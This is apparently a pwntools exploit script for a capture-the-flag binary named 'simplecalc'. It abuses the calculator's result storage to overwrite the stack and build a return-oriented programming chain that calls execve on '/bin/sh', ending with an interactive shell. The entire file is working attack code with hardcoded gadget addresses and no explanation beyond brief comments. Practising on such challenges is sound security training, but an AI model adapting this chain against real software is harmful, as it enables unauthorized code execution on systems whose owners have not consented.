import pwn 

pop_rax_ret = 0x44db34
pop_rdi_ret = 0x401b73
pop_rsi_ret = 0x401c87
pop_rdx_ret = 0x437a85
mov_rdi_rdx_ret = 0x400aba
bin_sh_2 = 0x0068732f 
bin_sh_1 = 0x6e69622f   
syscall = 0x400488

"""
ROP chain: low -> high
pop_rax_ret, 0x3b 
pop_rdx_ret, 0x68732f6e69622f 
pop_rdi_ret, 0x6c0000  
mov_rdi_rdx_ret 
pop_rsi_ret, 0x0 
pop_rdx_ret, 0x0 
syscall 
"""

proc = pwn.process("./simplecalc")
proc.read()
proc.sendline("100")       # number of calculations

# cover 0x48 bytes as zero, since each integer is 4-byte, we need to operate 18 times (72 / 4)
for i in range(18):
    proc.sendline("2")
    print(proc.recv())
    proc.sendline("100")
    print(proc.recv())
    proc.sendline("100")
    print(proc.recv())

# ROP chain
# pop_rax_ret
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(pop_rax_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# 0x3b 
proc.sendline("2")
proc.sendline("100")
proc.sendline(str(100 - 0x3b))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# pop_rdx_ret 
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(pop_rdx_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# "/bin/sh"
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(bin_sh_1 - 100))
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(bin_sh_2 - 100))

# pop_rdi_ret
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(pop_rdi_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# 0x6c0000
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(0x6c0000 - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# mov_rdi_rdx_ret
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(mov_rdi_rdx_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# pop_rsi_ret
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(pop_rsi_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# 0x0
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# pop_rdx_ret
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(pop_rdx_ret - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# 0x0
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

# syscall
proc.sendline("1")
proc.sendline("100")
proc.sendline(str(syscall - 100))
proc.sendline("2")
proc.sendline("100")
proc.sendline("100")     # padding

proc.sendline("5")
proc.interactive()
